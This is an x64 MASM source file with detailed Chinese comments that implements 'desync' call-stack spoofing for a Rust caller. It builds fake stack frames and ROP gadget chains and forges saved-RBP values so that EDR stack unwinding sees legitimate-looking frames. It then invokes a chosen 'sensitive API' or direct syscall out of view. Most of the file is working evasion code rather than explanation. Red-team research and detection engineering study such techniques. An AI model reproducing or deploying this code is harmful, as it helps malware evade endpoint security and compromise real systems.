;; desync模式:称为去同步/栈脱敏模式.当劫持或借用目标进程中一个已存在的合法工作线程(如已有的主线程,或threadpool线程)时,上游本来就是合法的系统代码.此时用desync模式在现有合法栈上做嫁接,轻量且逼真.与synthetic最大区别没有用BaseThreadInitThunk和RtlUserThreadStart
;; synthetic合成模式,用于在目标进程中新创建一个线程,这个线程本身是从私有内存启动的,没有任何合法的调用栈.此时必须用synthetic模式从零捏造一套以RtlUserThreadStart为起点的合法假栈

;; 注意栈是向低地址增长的,所以父函数firstframe处于高地址,子函数secondframe处于低地址.所以要先push firstframe.栈视图:
;; 高地址
;; 真实os的上游线程栈(os自带的RtlUserThreadStart ->BaseThreadInitThunk...)
;; rust的returnaddress
;; FirstFrame (RSP 模式)
;; SecondFrame (RBP 模式)
;; rop gadget(jmprbx + addrspx)
;; 敏感api




;;
;; code responsible for call stack spoofing via desync(masm)
;;

;;
;; export
;;

;; proto是prototype缩写,代表函数声明
Spoof proto

;; 总结一下 一个pe分别有多少.data .text .rdata等节区
.data

;;
;; configuration structure passed to the spoof asm routine
;;
;; 是rust和汇编之间进行ffi跨语言传输的数据结构体
Config STRUC
    RtlUserThreadAddr   DQ  1
    RtlUserThreadStartFrameSize DQ 1

    BaseThreadInitThunkAddr DQ 1
    BaseThreadInitThunkFrameSize DQ 1

    FirstFrame DQ   1
    SecondFrame DQ  1
    ;; cpu执行jmp [rbx]->读取rbx中的Restore槽位指针->执行Restore函数(清理所有假栈,安全返回rust主程序)
    JmpRbxGadget    DQ  1
    ;; 敏感api(r11中)被jmp引爆时,AddRspXGadget的物理地址被放在当前rsp处.敏感api的ret指令从栈顶弹出AddRspXGadget,cpu跳转执行AddRspXGadget内容:先将rsp+0x58(清理之前为目标api准备的堆栈),然后执行AddRspXGadget的ret弹出并开始执行jmprbxgadget
    AddRspXGadget   DQ  1

    FirstFrameSize DQ 1
    SecondFrameSize DQ  1
    JmpRbxGadgetFrameSize   DQ  1
    AddRspXGadgetFrameSize  DQ  1

    ;; 对于那些用rbp做栈帧基址的函数,其子函数可以用rbp也可以用rsp,但用rbp时必须保存父函数的rbp.而rbp只有一个
    ;; 存放SecondFrame栈帧内部saved rbp内存槽位与rsp相对偏移(使用rbp帧指针的函数,其局部栈帧会保存上层父函数的rbp,然后将rbp用于子函数的帧基址指针)
    ;; edr回溯时根据不同层级函数中保存的rbp的值,检查其单调性判定是否合法
    ;; 保存uwd.rs中检测父函数的偏移
    RbpOffset   DQ  1

    ;; 存放rust层想要隐蔽调用的目标敏感api的va
    SpooFunction    DQ  1
    ;; 存放rust层发起Spoof(&mut config)调用时,rust主程序的va,即call spoof指令下一行的rust指令地址
    ReturnAddress   DQ  1

    ;; DD define doubleword=i32/u32(rust).因对齐限制,这里置为DD,详见Synthetic.asm注释1
    IsSyscall                    DD 0
    Ssn                          DD 0

    NArgs                        DQ 1
    Arg01                        DQ 1
    Arg02                        DQ 1
    Arg03                        DQ 1
    Arg04                        DQ 1
    Arg05                        DQ 1
    Arg06                        DQ 1
    Arg07                        DQ 1
    Arg08                        DQ 1
    Arg09                        DQ 1
    Arg10                        DQ 1
    Arg11                        DQ 1
Config ENDS


.code

;;
;; function responsible for call stack spoofing
;;
Spoof PROC
    ;; 
    ;; saving non-vol registers
    ;;
    push    rbp
    push    rbx

    ;;
    ;; return main(return to rust)
    ;;
    mov rbp,rsp

    ;;
    ;; creating stack pointer to restore PROC
    ;;

    ;; lea利用x64的rip相对寻址机制,计算出Restore的va,并存入rax.lea只取地址,绝不解引用读取地址中的机器码
    lea rax,Restore
    push rax
    ;; [rsp]代表rsp在内存中的地址,将该内存地址给rbx
    ;; lea只取地址,如果换成mov rbx,[rsp]会崩溃.mov会强行解引用[rsp]中数据(即 机器码).即lea中,rbx是二级指针,mov中rbx是一级指针
    ;; 且后续rop gadget指令为kernelbase!jmp [rbx]:硬件电路规定jmp [rbx]时,必须取rbx记录的地址解引用读取一次数据,再跳转
    ;; 如果非要用mov 应该用mov rbx,rsp
    lea rbx,[rsp]

    ;;
    ;; first frame (fake origin)
    ;;
    push    [rcx].Config.FirstFrame

    mov rax,[rcx].Config.ReturnAddress
    ;; 这里计算FirstFrameSize大小的栈空间,并将结果存入rax.这是rax表示firstframe如果真正跑起来,它的虚拟rbp应该的位置.注意这里并没有真正的开辟rax表示的栈空间大小.rax后续用来在secondframe中,当作父函数的rbp保存起来.
    ;; 正常运行FirstFrame函数时,其序言会执行sub rsp,40h把rsp下移64字节.但在这里伪造FirstFrame时,为了节省栈/不破坏现场,物理上没有在栈上开辟这64字节.
    ;; 关于用rax代替rsp计算 详见注释1
    sub rax,[rcx].Config.FirstFrameSize

    ;; secondframe 承载了rop跳板与参数传递的物理任务,需要真正开辟栈空间,所以执行了 sub rsp
    ;; 将firstframe的虚拟rbp放入secondframe的帧基部(靠近父函数的高地址端)
    sub rsp,[rcx].Config.SecondFrameSize
    mov r10,[rcx].Config.RbpOffset
    mov [rsp+r10],rax

    ;;
    ;; rop frames
    ;;
    push [rcx].Config.SecondFrame


    ;;
    ;; jmp [rbx] gadget/stack pivot(to restore original control flow stack)
    ;;
    ;; 压栈jmp [rbx]将其作为函数使用,用于返回rust执行流
    ;; JmpRbxGadget = jmp QWORD PTR [rbx] (跳转到rbx指向的8字节内存地址拿到restore入口地址,cpu把这个入口地址写入rip,再去地址抓取机器码执行)
    ;; rbx对应的内存地址中存放的是restore退场函数
    sub rsp,[rcx].Config.JmpRbxGadgetFrameSize
    push [rcx].Config.JmpRbxGadget

    ;; 压栈AddRspXGadget将其作为函数使用,用于清理88字节的敏感api调用后,残留的栈数据(预留共11个参数,32字节影子空间+56字节arg05-arg11共7个栈上参数)
    ;; add rsp 58h
    ;; ret
    ;; 并将rsp精准停留在下一跳JmpRbxGadget
    sub rsp,[rcx].Config.AddRspXGadgetFrameSize
    push [rcx].Config.AddRspXGadget

    ;;
    ;; Set the pointer to the function to call in R11
    ;;
    mov r11, [rcx].Config.SpooFunction
    jmp Parameters
Spoof ENDP

;;
;; set the parameters to pass to the target function
;;
Parameters PROC
;; Parameters -> Execute -> jmp QWORD PTR r11 -> 敏感api.敏感api执行需要用rcx承载其第一个参数.但此时rcx已经承载了指向Config的指针.所以需要先保存rcx到r12.
;; call会压栈,准备被调用函数的参数,用到rcx.而jmp只修改rip,不压栈,不准备被调用函数的参数,用不到rcx
mov r12,rcx
;; rax之前计算的 FirstFrame 虚拟 RBP 已写入物理内存 [rsp+r10],此处将 RAX 覆写为目标 API 的实际参数总个数 (NArgs)
mov rax,[r12].Config.NArgs

;Arg01(rcx)
cmp rax,1
;; cmp的结果小于跳转,等于1也不跳转
jb skip_1
;; 没有跳转代表,至少有1个参数,下一句先把第一个参数放到rcx
mov rcx,[r12].Config.Arg01

skip_1:
    ; Arg02 (rdx)
    cmp rax, 2
    jb skip_2
    mov rdx, [r12].Config.Arg02
    
skip_2:
    ; Arg03 (r8)
    cmp rax, 3
    jb skip_3
    mov r8, [r12].Config.Arg03

skip_3:
    ; Arg04 (r9)
    cmp rax, 4
    jb skip_4
    mov r9, [r12].Config.Arg04

skip_4:
    ; Stack-based args
    lea r13, [rsp] 

    cmp rax, 5
    jb skip_5
    mov r10, [r12].Config.Arg05
    mov [r13 + 28h], r10

skip_5:
    ; Arg06
    cmp rax, 6
    jb skip_6
    mov r10, [r12].Config.Arg06
    mov [r13 + 30h], r10

skip_6:
    ; Arg07
    cmp rax, 7
    jb skip_7
    mov r10, [r12].Config.Arg07
    mov [r13 + 38h], r10

skip_7:
    ; Arg08
    cmp rax, 8
    jb skip_8
    mov r10, [r12].Config.Arg08
    mov [r13 + 40h], r10
    
skip_8:
    ; Arg09
    cmp rax, 9
    jb skip_9
    mov r10, [r12].Config.Arg09
    mov [r13 + 48h], r10

skip_9:
    ; Arg10
    cmp rax, 10
    jb skip_10
    mov r10, [r12].Config.Arg10
    mov [r13 + 50h], r10

skip_10:
    ; Arg11
    cmp rax, 11
    jb skip_11
    mov r10, [r12].Config.Arg11
    mov [r13 + 58h], r10

skip_11:
    cmp [r12].Config.IsSyscall, 1
    je ExecuteSyscall

    jmp Execute
Parameters ENDP


;;
;; Restores the original stack frame
;;
;; 前文JmpRbxGadget调用的restore
Restore PROC
    ;; 前文用rbp保存了rust执行流进入spoof函数时的rsp,这里恢复rsp,直接回到了执行流
    mov rsp, rbp
    pop rbx
    pop rbp
    ret
Restore ENDP

;;
;; Executes the target function
;;
Execute PROC
    jmp QWORD PTR r11
Execute ENDP

;;
;; Executes a native Windows system call using the spoofed context
;;
ExecuteSyscall PROC
    mov r10, rcx
    mov eax, [r12].Config.Ssn
    jmp QWORD PTR r11
ExecuteSyscall ENDP


END










;; 注释1
;; 1. ReturnAddress是什么,它是rust层调用Spoof前,当时rsp停留的干净的真实栈基准.而这个干净的返回地址,也是干净的当时的rsp已经赋给了Config.ReturnAddress
;; 2. 在Spoof PROC中,前面执行了push rbp/rbx/rax(Restore地址)/FirstFrame.rsp已经自动下移32字节
;; 如果再用sub rsp,[rcx].Config.FirstFrameSize 就多减去了32字节.因此用的是 sub rax,[rcx].Config.FirstFrameSize来计算firstframe真实跑起来,它的虚拟rbp所在位置(返回地址下方就是子函数保存的旧的父函数rbp的位置)
;; rax代表的firstframe为啥没有真正的开辟栈空间
;; desync中,没有斩断线程历史,而是在rust真实调用者的栈帧上,凭空嫁接一个伪造的first假帧.edr在栈回溯时,如果发现secondframe恢复出来的rbp不具有单调性就会告警.因此,secondframe的栈帧中必须写入一个合法的firstframe rbp坐标.
;; 已知,rust发起调用前,物理rsp停留在干净的returnaddress处
;; 已知,假如firstframe真的执行,它的虚拟rbp的内容
;; 后续在mov r10, [rcx].Config.RbpOffset 找到 Saved RBP 的槽位偏移
;; mov [rsp + r10], rax 这里将rax中的数据强行写入secondframe的物理内存中.即secondframe专属的saved rbp槽位中.
;; rbpoffset解决的是saved rbp槽位距离rsp的相对偏移,而rax解决的是真实的内容,即firstframe的虚拟rbp这个真实的内容
;; edr只是展开.pdata进行计算,EDR 仅查阅 .pdata在算法模拟器里加减，不检查物理内存； 因此，FirstFrame 无需物理 sub rsp 开辟空间，绝对不浪费物理 RAM与堆栈平衡

;; 关于序言和尾声
;; 函数序言和尾声是高级语言通过编译器编译时产生的,是嵌入二进制文件的.而汇编中的函数对应的序言和尾声都是需要自己写出来的,和call或者jmp调用没有关系
;; ROP Gadget 正是通过将 RIP直接空降到系统函数的中后段指令切片，在执行期物理绕过入口序言的干扰，同时在回溯期借用该函数在 .pdata 中的合法元数据完美欺骗 EDR 展开器